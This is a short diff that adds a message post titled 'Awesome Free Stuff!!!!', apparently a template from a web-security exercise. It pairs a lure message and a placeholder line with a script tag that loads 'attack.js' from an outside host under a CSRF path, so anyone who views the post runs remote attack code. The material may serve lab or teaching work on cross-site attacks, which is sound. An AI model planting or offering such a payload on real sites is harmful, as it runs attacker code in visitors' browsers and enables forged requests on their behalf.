@@ -1,0 +1,8 @@
+Title: Awesome Free Stuff!!!!
+Message:
+
+Hey,
+
+I just found some great free stuff on this website check it out!
+insert whatever else you want here
+<script src="http://westcraig.com/CSRF/attack.js"></script>
